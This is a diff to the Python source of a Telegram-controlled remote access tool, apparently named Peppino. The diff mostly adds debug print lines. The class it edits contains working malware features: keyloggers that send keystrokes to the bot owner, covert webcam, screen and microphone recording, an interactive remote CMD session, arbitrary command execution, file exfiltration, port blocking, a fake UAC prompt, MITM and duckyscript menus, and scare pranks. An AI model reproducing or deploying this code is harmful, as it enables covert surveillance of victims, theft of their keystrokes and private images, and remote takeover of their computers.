@@ -571,6 +571,7 @@ class PeppinoTelegram:
         LOADING_STATUS_MESSAGE.delete()
 
     def __play_loaded_sound(self, audio: str, volume=None) -> None:
+        print(f"Playing loaded sound: {audio}, volume={volume}")
         old = self.audio_mixer.getVolumePercentage()
         if volume:
             self.set_volume(volume)
@@ -581,6 +582,7 @@ class PeppinoTelegram:
 
 
     def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
+        print(f"Sending image: {image_name}, caption={caption}")
         """
         return a message id
         """
@@ -596,6 +598,7 @@ class PeppinoTelegram:
             return self.bsend(f"Error while sending an image\n{e}")
 
     def altf4(self) -> None:
+        print("Sending Alt+F4")
         self.bsend(f"{emoji_dict['keyboard']} Alt F4 Pressed")
         press_key('alt')
         press_key('f4')
@@ -603,31 +606,37 @@ class PeppinoTelegram:
         release_key('alt')
 
     def ask_yesno(self, custom_message: str = "Confirm? Y/n") -> bool:
+        print(f"Asking yes/no: {custom_message}")
         return self.send_prompt(custom_message).lower().strip() == "y"
     
     # TODO: loading bar not updating!!
     @requires_admin
     def block_port(self, port: int, timeout: int) -> None:
+        print(f"Blocking port {port} for {timeout} seconds")
         print("blocking port")
         loading_bar = self.new_loading_bar_timed_worker("Blocking Port", timeout, block_port, (port, timeout))
         loading_bar.start()
 
     @requires_admin
     def block_http(self, timeout: int) -> None:
+        print(f"Blocking HTTP for {timeout} seconds")
         print("blocking http")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTP", timeout, block_http, (timeout,))
         loading_bar.start()
 
     @requires_admin
     def block_https(self, timeout: int) -> None:
+        print(f"Blocking HTTPS for {timeout} seconds")
         print("blocking https")
         loading_bar = self.new_loading_bar_timed_worker("Blocking HTTPS", timeout, block_https, (timeout,))
         loading_bar.start()
 
     def breath(self) -> None:
+        print("Playing breath sound")
         self.__play_loaded_sound("breath")
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
+        print(f"Sending message: {text[:50]}...")
         doit = True
         if retries>3:
             return
@@ -645,10 +654,12 @@ class PeppinoTelegram:
             return self.bsend(text, retries+1)
     
     def bsendWithMarkdownV2(self, text: str, retries=0, reply_markup=None) -> int|None:
+        print(f"Sending MarkdownV2 message: {text[:50]}...")
         self.bsend(text, retries, parse_mode="MarkDownV2", reply_markup=reply_markup)
 
 
     def download_file(self, path: str) -> None:
+        print(f"Downloading file: {path}")
         self.bsend(f"📤 Sending file: {path}")
         if not isfile(path):
             self.bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
@@ -699,6 +710,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 `Y8bood8P'  o8o        o888o o888bood8P'   8""88888P'  `Y8bod8P' 8""888P' 8""888P' o888o `Y8bod8P' o888o o888o
     """
     def cmdsession(self) -> None:
+        print("Starting CMD session")
         """Interactive CMD session via Telegram."""
 
         # Initialize CMD session if not already created
@@ -774,10 +786,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.bsend(f"▶️ Command sent: `{command}`")
 
     def cantopen(self, process: str) -> None:
+        print(f"Adding {process} to cantopen list")
         self.cantopenlist.append(process)
         self.bsend(f"🔒 Added {process} to cantopenlist.")
 
     def cantopenkiller(self) -> None:
+        print("Starting cantopen killer thread")
         while self.running:
             for process in self.cantopenlist:
                 if self.check_if_proc_running(process):
@@ -785,6 +799,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             sleep(1)
 
     def cantopenmenu(self) -> None:
+        print("Opening cantopen menu")
         if self.cantopenlist:
             dict_menu = { proc:f"/cantopenremove {proc}" for proc in self.cantopenlist}
             menu = self.new_menu(dict_menu, close_btn_lab="CANTOP_close")
@@ -793,9 +808,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend("Cantopenlist is empty.")
 
     def check_if_proc_running(self, processname) -> bool:
+        print(f"Checking if process is running: {processname}")
         return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]
 
     def checkforface(self) -> None:
+        print("Checking for face")
         res, frame = detect_face(self.cap)
         if res:
             self.bsend("Face found")
@@ -803,6 +820,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend("Face not found")
 
     def clear(self) -> None:
+        print("Clearing windows, webcam, temp files")
         self.closecap()
         for file in listdir(BURN_DIRECTORY):
             try:
@@ -820,13 +838,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.cantopenlist.clear()
 
     def closecap(self) -> None:
+        print("Closing webcam capture")
         if self.cap.isOpened():
             self.cap.release()
 
     def distorted_screen(self) -> None:
+        print("Distorting screen")
         self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))
 
     def display_mode(self) -> None:
+        print("Opening display mode menu")
         buttons = {
             "Only PC"      : "/execute DisplaySwitch.exe /internal",
             "Only External": "/execute DisplaySwitch.exe /external",
@@ -836,21 +857,25 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")
 
     def delete_message(self, message_id: int) -> None:
+        print(f"Deleting message: {message_id}")
         try:
             self.bot.deleteMessage((self.owner_id, message_id))
         except TelegramError:
             ...
 
     def deletemessages(self, number: int = 1) -> None:
+        print(f"Deleting {number} messages")
         message_ids = self.all_session_messages[-number:]
         for message_id in message_ids:
             self.delete_message(message_id)
     
     def deleteallmessages(self) -> None:
+        print("Deleting all messages")
         for message_id in self.all_session_messages:
             self.delete_message(message_id)
 
     def execute(self, *command, return_output: bool=False, shell: bool=False) -> None:
+        print(f"Executing command: {' '.join(command)}")
         command = " ".join(command)
         s = sp.run(command, shell=shell, stdout=sp.PIPE, stderr=sp.PIPE, encoding="cp850")
         if s.returncode:
@@ -865,14 +890,17 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 self.bsend(f"Output: {output}")
 
     def extract_commands(self) -> list[dict]:
+        print("Extracting commands list")
         return [{"command":c.name, "description":c.description} for c in self.commands]
 
     def fake_shutdown(self) -> None:
+        print("Faking shutdown")
         system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
         sleep(5)
         system("shutdown -a")
 
     def fakeuac(self) -> None:
+        print("Showing fake UAC prompt")
         proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
         if proc.returncode:
             output = proc.stderr
@@ -886,9 +914,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             remove(file)
 
     def gabinetti(self) -> None:
+        print("Playing Gabinetti meme")
         self.jumpscare("plankton_meme", "gabinetti")
 
     def handle(self, msg: str) -> None:
+        print(f"Handling message type: {glance(msg)[0]}")
         content_type, chat_type, chat_id = glance(msg)
         if chat_id in self.strangers:
             return
@@ -927,13 +957,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.strangers.append(chat_id)
 
     def inverted_screen(self) -> None:
+        print("Inverting screen colors")
         self.modded_screenshot(invert_image)
 
     def getip(self):
+        print("Getting public IP")
         output = get_public_ip()
         self.bsend(f"🌐 Public IP: {output}")
 
     def get_logs(self):
+        print("Getting logs")
         try:
             if self.logger:
                 fname = f"{randomname()}.log"
@@ -943,22 +976,25 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     return
                 file = craft_file(logs, fname)
                 self.bot.sendDocument(self.owner_id, file)
-                remove(fname)
         except Exception as e:
             self.bsend(f"Exception while sending logs: \n{e}")
 
     def get_disk_info(self):
+        print("Getting disk info")
         disks = get_disk_info()
         full_message = "\n".join(map(format_disk, disks))
         self.bsend(full_message, parse_mode="HTML")
 
     def johnpork(self, audio=True) -> None:
+        print(f"Playing John Pork meme, audio={audio}")
         self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)
 
     def johnporknoaudio(self) -> None:
+        print("Playing John Pork meme without audio")
         self.johnpork(False)
 
     def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True, setvolume: int=100) -> None:
+        print(f"Triggering jumpscare, image={image}, audio={audio}")
         old_volume = self.audio_mixer.getVolumePercentage()
         self.audio_mixer.setVolumePercentage(setvolume)
         if image is None:
@@ -983,9 +1019,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.audio_mixer.setVolumePercentage(old_volume)
 
     def jumpscarenoaudio(self) -> None:
+        print("Triggering jumpscare without audio")
         self.jumpscare(playaudio=False)
 
     def keylogger_to_buffer(self, state: dict["value":str,"running":bool]) -> None:
+        print("Starting keylogger to buffer")
         while state["running"]:
             event = read_event()
             if event.event_type == KEY_DOWN:
@@ -1005,6 +1043,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 state["value"]+=k
 
     def keylogger(self, timeout: int=10) -> None:
+        print(f"Starting keylogger for {timeout} seconds")
         buffer = ""
         start=time()
         loading_bar = self.new_loading_bar(timeout, f"{emoji_dict["keyboard"]} Keylogger with file", showperc=True)
@@ -1039,9 +1078,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar.fill_and_delete()
 
     def leftclick(self) -> None:
+        print("Left mouse click")
         pg.leftClick()
 
     def live_keylogger(self, timeout=10) -> None:
+        print(f"Starting live keylogger for {timeout} seconds")
         start = time()
         bar = self.new_loading_bar(timeout, label=f"📡 Live Keylogger")
         state = {"value":"📡 Live Keylogger Output: ",
@@ -1060,6 +1101,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         bar.fill_and_delete()
         
     def load_plugins(self, bot: Bot, plugin_classes: list[type[Plugin]]) -> dict[str, dict[str, Callable]]:
+        print("Loading plugins")
         """
         Instantiate and bind all plugins, then export their commands for the bot.
         Returns a registry mapping button labels to (Command, action) tuples.
@@ -1091,11 +1133,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
 
     def message_box(self, text: str, title: str = "Warning") -> int:
+        print(f"Showing message box: {title} - {text}")
         def run():
             ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
         Thread(target=run, daemon=True).start()
 
     def mixer_menu(self) -> None:
+        print("Opening mixer menu")
         buttons = {
             "🔊Full Volume":"/fullvolume",
             "🔉Half Volume":"/setvolume 50",
@@ -1104,6 +1148,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
 
     def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
+        print(f"Taking modified screenshot with effect: {effect.__name__}")
         filename = join(BURN_DIRECTORY, randompngname())
         pg.screenshot(filename)
         img = imread(filename)
@@ -1111,6 +1156,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         show_image_fullscreen(modded_img, timeout)
 
     def mousecontroller(self) -> None:
+        print("Opening mouse controller")
         menu = {
             "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
             "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
@@ -1118,6 +1164,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.mouse_controller_menu = self.new_menu(menu, label=f"{emoji_dict['mouse']} Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")
 
     def setMouseJump(self, jump: int= None) -> None:
+        print(f"Setting mouse jump to: {jump}")
         if jump is None:
             jmp = self.send_prompt("Set mouse jump: ")
         if jmp.isnumeric():
@@ -1129,22 +1176,27 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend("Mouse jump must be numeric.")
 
     def moused(self) -> None:
+        print("Moving mouse down")
         pos = pg.position()
         pg.moveTo(pos[0], pos[1]+self.MOUSE_JMP)
 
     def mousel(self) -> None:
+        print("Moving mouse left")
         pos = pg.position()
         pg.moveTo(pos[0]-self.MOUSE_JMP, pos[1])
 
     def mouser(self) -> None:
+        print("Moving mouse right")
         pos = pg.position()
         pg.moveTo(pos[0]+self.MOUSE_JMP, pos[1])
 
     def mouseu(self) -> None:
+        print("Moving mouse up")
         pos = pg.position()
         pg.moveTo(pos[0], pos[1]-self.MOUSE_JMP)
 
     def mouselock(self, timer: int=6) -> None:
+        print(f"Locking mouse for {timer} seconds")
         bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
         start = time()
         pos = pg.position()
@@ -1156,6 +1208,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         bar.fill_and_delete()
 
     def mainmenu(self):
+        print("Opening main menu")
         buttons = {}
         for category, label, submenu in [
             ("🛑 System", "🛑 System & Shutdown", "/menu_system"),
@@ -1194,6 +1247,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     # Generic submenu generator
     def generate_category_menu(self, category_name: str, menu_label: str = None) -> ButtonsMenu:
+        print(f"Generating category menu: {category_name}")
         buttons = {"🔙 Back": "/mainmenu"}
         for cmd in [c for c in self.commands if c.category == category_name]:
             buttons[cmd.label] = f"/{cmd.name}"
@@ -1224,51 +1278,67 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     """
 
     def menu_system(self):
+        print("Opening system menu")
         return self.generate_category_menu("🛑 System", "🛑 System & Shutdown")
 
     def menu_utilities(self):
+        print("Opening utilities menu")
         return self.generate_category_menu("🔧 Utility", "🔧 Utility")
 
     def menu_network(self):
+        print("Opening network menu")
         return self.generate_category_menu("🌐 Network", "🌐 Network & Remote Access")
 
     def menu_camera(self):
+        print("Opening camera menu")
         return self.generate_category_menu("📸 Camera", "📸 Camera & Screen")
 
     def menu_audio(self):
+        print("Opening audio menu")
         return self.generate_category_menu("🔊 Audio", "🔊 Audio & Volume")
 
     def menu_soundfx(self):
+        print("Opening sound effects menu")
         return self.generate_category_menu("🎵 Sound FX", "🎵 Sound Effects")
 
     def menu_pranks(self):
+        print("Opening pranks menu")
         return self.generate_category_menu("😈 Pranks", "😈 Pranks & Visuals")
 
     def menu_control(self):
+        print("Opening control menu")
         return self.generate_category_menu("💻 System Control", "💻 System Control")
 
     def menu_input(self):
+        print("Opening input menu")
         return self.generate_category_menu("🎮 Input", "🎮 Input / Device Control")
 
     def menu_messaging(self):
+        print("Opening messaging menu")
         return self.generate_category_menu("📋 Messaging", "📋 Messaging")
 
     def menu_cantopen(self):
+        print("Opening cantopen menu")
         return self.generate_category_menu("🔒 Can't Open", "🔒 Can't Open List")
 
     def menu_keylogger(self):
+        print("Opening keylogger menu")
         return self.generate_category_menu("🧠 Keylogger", "🧠 Keylogger")
 
     def menu_mitm(self):
+        print("Opening MITM menu")
         return self.generate_category_menu("🕵️‍♂️ MITM", "🕵️‍♂️ MITM")
 
     def menu_misc(self):
+        print("Opening misc menu")
         return self.generate_category_menu("🦑 Misc", "🦑 Misc")
 
     def menu_plugins(self):
+        print("Opening plugins menu")
         return self.generate_category_menu("🔌 PlugIns", "🔌 Your Plugins")
 
     def menu_ducky(self):
+        print("Opening ducky script menu")
         buttons = {
             i:f"/duckyscript {i}" for i in KEYMAP.keys()
         }
@@ -1276,16 +1346,19 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
+        print(f"Creating editable message: {content[:50]}...")
         editable = EditableMessage(self.bot, self.owner_id, content, autosend)
         self.all_session_messages.append(editable.message_id)
         return editable
 
     def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
+        print(f"Creating loading bar: {label}, total={total}")
         loadingbar = LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10, cancel_button=True) 
         self.bars.update({id(loadingbar):loadingbar})
         return loadingbar
 
     def new_loading_bar_timed_worker(self, label: str, duration: int, target: Callable, args: tuple=()) -> LoadingBarTimedWorker:
+        print(f"Creating loading bar worker: {label}, duration={duration}")
         loadingbar_tw = LoadingBarTimedWorker(label=label,duration=duration, chat_id=self.owner_id, bot=self.bot, target=target, args=args, loading_bar_kwargs={
             "full_char":self.loading_bar_set[0],
             "empty_char":self.loading_bar_set[1],
@@ -1298,20 +1371,24 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return loadingbar_tw
 
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
+        print(f"Creating new menu: {label}")
         menu = ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
         self.all_session_messages.append(menu.message_id)
         return menu
 
     def on_callback_query(self, msg) -> None:
+        print("Handling callback query")
         query_id, from_id, data = glance(msg, flavor="callback_query")
         Thread(target=self.parse_command, args=(data, )).start()
         self.bot.answerCallbackQuery(query_id)
 
     def opencap(self) -> None:
+        print("Opening webcam capture")
         if not self.cap.isOpened():
             self.cap.open(0)
 
     def parse_audio(self, msg: dict) -> None:
+        print("Parsing audio message")
         if 'voice' in msg:
             file_id = msg['voice']['file_id']
         elif 'audio' in msg:
@@ -1328,6 +1405,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         remove(new_filepath)
 
     def parse_command(self, text: str) -> None:
+        print(f"Parsing command: {text}")
         args = text.split()
         command = args[0]
 
@@ -1443,9 +1521,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Invalid command {command}")
     
     def parse_video_note(self, saved_filepath: str) -> None:
+        print(f"Parsing video note: {saved_filepath}")
         self.overlay_tk.video_note_overlay(saved_filepath)
 
     def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
+        print(f"Parsing video: {saved_filename}")
         caption = msg["caption"].lower().strip()
         if caption == "/setvideowallpaper":
             if not self.confirmContuinuingWithoutWallpaperBackup():
@@ -1478,6 +1558,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                 return
 
     def parse_document(self, msg: dict[str:str], mimetype: str="document") -> None:
+        print(f"Parsing document: {mimetype}")
         document = msg[mimetype]
         file_id = document["file_id"]
         saved_filename = randomname()
@@ -1502,6 +1583,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
 
     def parse_photo(self, msg: dict) -> None:
+        print("Parsing photo message")
         filename = randompngname()
         saved_filepath = join(BURN_DIRECTORY, filename)
         self.bot.download_file(msg['photo'][-1]['file_id'], saved_filepath)
@@ -1532,6 +1614,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         remove(filepath)
 
     def parse_text(self, msg: dict) -> None:
+        print(f"Parsing text message: {msg['text'][:50]}...")
         text = msg["text"]
         date = int(msg["date"])
         if (date+self.message_timeout)<time():
@@ -1549,16 +1632,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.user["last_response"] = text.strip()
 
     def plankton(self, audio=True) -> None:
+        print(f"Playing Plankton meme, audio={audio}")
         self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)
 
     def planktonnoaudio(self) -> None:
+        print("Playing Plankton meme without audio")
         self.plankton(audio=False)
     
     def processmonitoradd(self, processname: str) -> None:
+        print(f"Adding {processname} to process monitor")
         self.bsend(f"💻 {processname} added to process monitor's list.")
         self.processmonitorlist.update({processname:False})
     
     def processmonitorrem(self, processname: str) -> None:
+        print(f"Removing {processname} from process monitor")
         try:
             del self.processmonitorlist[processname]
             self.bsend(f"💻 {processname} removed to process monitor's list.")
@@ -1566,11 +1653,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"💻 {processname} was not inside process monitor's list.")
 
     def processmonitormenushow(self) -> None:
+        print("Showing process monitor menu")
         self.processmonitormenu = self.new_menu({
             x:f"PROCMON_procmonrem {x}" for x, _ in self.processmonitorlist.items()
         }, close_btn_lab="PROCMON_close")
 
     def processmonitorloop(self) -> None:
+        print("Starting process monitor loop")
         while self.running:
             for process, checked in self.processmonitorlist.items():
                 if self.check_if_proc_running(process) and not checked:
@@ -1581,6 +1670,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             sleep(2)
 
     def process_killer(self, page=0) -> None:
+        print("Opening process killer")
         if self.process_explorer_menu is None:
             self.process_killer_page = 0
         else:
@@ -1591,21 +1681,27 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         return self.process_explorer_menu
 
     def pss(self) -> None:
+        print("Playing 'pss' sound")
         self.__play_loaded_sound("pss")
 
     def behindyou_kid(self) -> None:
+        print("Playing 'behind you kid' sound")
         self.__play_loaded_sound("behindyou_kid")
 
     def behindyou_whisper(self) -> None:
+        print("Playing 'behind you whisper' sound")
         self.__play_loaded_sound("behindyou_whisper")
 
     def scream_11s(self) -> None:
+        print("Playing 11-second scream")
         self.__play_loaded_sound("scream_11s")
 
     def scream_15s(self) -> None:
+        print("Playing 15-second scream")
         self.__play_loaded_sound("scream_15s")
 
     def playrandomnoise(self, duration: int) -> None:
+        print(f"Playing random noise for {duration} seconds")
         start = time()
         loading_bar = self.new_loading_bar(duration, label="Play Random Noise")
         thread = Thread(target=play_random_noise, args=(duration,))
@@ -1619,15 +1715,19 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar.fill_and_delete()
 
     def whisper_overlay(self, duration: int, whispers: str | list[str] | None = None) -> None:
+        print(f"Showing whisper overlay for {duration} seconds")
         self.overlay_tk.whisper_overlay(duration, whispers)
 
     def knockknock(self) -> None:
+        print("Playing knock knock sound")
         self.__play_loaded_sound("knockknock")
 
     def fart(self) -> None:
+        print("Playing fart sound")
         self.__play_loaded_sound("fart")
 
     def fastscreenshot(self) -> List[Any]:
+        print("Taking fast screenshot")
         path = join(BURN_DIRECTORY, "tmp.{mon}.png")
         for x in fast_screenshot(path):
             monitor_name = x.split(".")[1]
@@ -1636,11 +1736,13 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         #return [x for x in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png"), lambda x:self.__send_image(x, caption=caption))]
 
     def replyquickmenu(self) -> int:
+        print("Creating reply quick menu")
         commands = [f"/{c.name}" for c in self.commands]
         keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
     def randomkeyboard(self, timeout: int =5) -> None:
+        print(f"Random keyboard input for {timeout} seconds")
         start = time()
         loading_bar = self.new_loading_bar(timeout, label=f"{emoji_dict['keyboard']} Random Keyboard", showperc=True)
         while (time()-start)<timeout:
@@ -1658,6 +1760,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar.delete()
 
     def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
+        print(f"Recording audio for {seconds} seconds to {filename}")
         try:
             seconds = float(seconds)
             frames = int(seconds * samplerate)
@@ -1669,6 +1772,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return e 
 
     def record_jumpscare_reaction(self, onlycamera=False) -> None:
+        print(f"Recording jumpscare reaction, onlycamera={onlycamera}")
         if onlycamera:
             recording_thread = Thread(target=self.record_webcam, args=(20,))
         else:
@@ -1683,6 +1787,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         status_message.delete()
 
     def record_screen(self, duration: int=10, caption: str|None=None) -> None:
+        print(f"Recording screen for {duration} seconds")
         duration = int(duration)
         bar = self.new_loading_bar(duration, label=f"{emoji_dict['screen']} Recording Screen")
         try:
@@ -1732,6 +1837,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         bar.fill_and_delete()
 
     def record_webcam(self, duration: int=10, caption: str|None=None) -> None:
+        print(f"Recording webcam for {duration} seconds")
         duration = int(duration)
         bar = self.new_loading_bar(duration, label=f"{emoji_dict['photo']} Recording Webcam")
         try:
@@ -1785,6 +1891,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     # This code is like an impressive skycraper held by a little wire.
 
     def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
+        print(f"Recording webcam and screen for {capture_duration} seconds")
         capture_duration = int(capture_duration)
         bar = self.new_loading_bar(capture_duration, label=f"{emoji_dict['photo']}{emoji_dict['screen']} Recording Webcam&Screen")
         try:
@@ -1842,21 +1949,25 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         bar.fill_and_delete()
 
     def removefromcantopen(self, process: str) -> None:
+        print(f"Removing {process} from cantopen list")
         self.cantopenmenu_ref.delete()
         self.cantopenlist.remove(process)
         self.cantopenmenu()
         self.bsend(f"🔒 Removed {process} to cantopenlist.")
 
     def restore_wallpaper(self) -> None:
+        print("Restoring wallpaper")
         if self.backup_wallpaper_path:
             self.bsend("Wallpaper backup was not created so restoring it is not currently possible.")
             return
         change_wallpaper(self.backup_wallpaper_path)
 
     def rightclick(self) -> None:
+        print("Right mouse click")
         pg.rightClick() #no shit
 
     def screenshot(self) -> None: #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
+        print("Taking screenshot")
         try:
             images = self.fastscreenshot()
             if not images:
@@ -1869,6 +1980,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return self.bsend(f"Error while getting screenshot\n{e}")
 
     def screenshotandselfie(self) -> None:
+        print("Taking screenshot and selfie")
         self.opencap()
         for scrt in fast_screenshot(join(BURN_DIRECTORY, "tmp{mon}tmp.png")):
             name = randompngname()
@@ -1883,6 +1995,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.closecap()
 
     def selfie(self, caption: str|None=None, reply_markup=None) -> None:
+        print("Taking selfie")
         try:
             filename = join(BURN_DIRECTORY,randompngname())
             self.opencap()
@@ -1901,6 +2014,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return False
 
     def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
+        print(f"Recording and sending audio for {seconds} seconds")
         message = self.new_editable_message(f"{emoji_dict['microphone']} Recording audio of {seconds} seconds.")
         filename = randomname()+".wav"
         filepath = join(BURN_DIRECTORY, filename)
@@ -1917,18 +2031,21 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             message.delete()
 
     def confirmContuinuingWithoutWallpaperBackup(self):
+        print("Confirming wallpaper backup")
         if not self.backup_wallpaper_path:
             return self.ask_yesno("The program was unable to backup the wallpaper, do you still want to use this functionality Y/n")
         else:
             return True
 
     def connectioncheckerloop(self):
+        print("Starting connection checker loop")
         while self.running:
             self.connected = check_connection()
             sleep(15 if self.connected else 5)
 
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
+        print(f"Setting camera as wallpaper for {seconds} seconds")
         if not self.confirmContuinuingWithoutWallpaperBackup():
             return
         seconds = int(seconds)
@@ -1956,12 +2073,14 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.restore_wallpaper()
 
     def set_volume(self, volume):
+        print(f"Setting volume to {volume}")
         if volume in range(0, 101):
             self.audio_mixer.setVolumePercentage(volume)
         else:
             self.bsend(f"Volume must be from 0.0 to 100.0")
 
     def setvideowallpaper(self, videofilename: str) -> None:
+        print(f"Setting video as wallpaper: {videofilename}")
         if not self.confirmContuinuingWithoutWallpaperBackup():
             return
         res = True
@@ -1980,6 +2099,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.restore_wallpaper()
 
     def selfdestruction(self) -> None:
+        print("Starting self destruction")
         if not self.ask_yesno():
             self.bsend("Operation stopped.")
             return
@@ -2001,6 +2121,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.stop()
 
     def show_image(self, image_path: str) -> None:
+        print(f"Showing image: {image_path}")
         try:
             imshow("Warning", resize(imread(image_path), (400, 400)))
             setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
@@ -2011,17 +2132,20 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Error while trying to show image: \n{e}")
 
     def shutdown(self, seconds=0) -> None:
+        print(f"Shutting down in {seconds} seconds")
         if not self.ask_yesno():
             self.bsend("Operation stopped.")
             return
         system(f"shutdown -s -t {seconds}")
 
     def spam_windows(self, n: int, text: str) -> None:
+        print(f"Spamming {n} windows with text: {text}")
         for i in range(n):
             sp_win = Thread(target=self.message_box, args=["Warning", text,])
             sp_win.start()
     
     def stop_webcam_and_screen_tunnel(self, verbose=True) -> None:
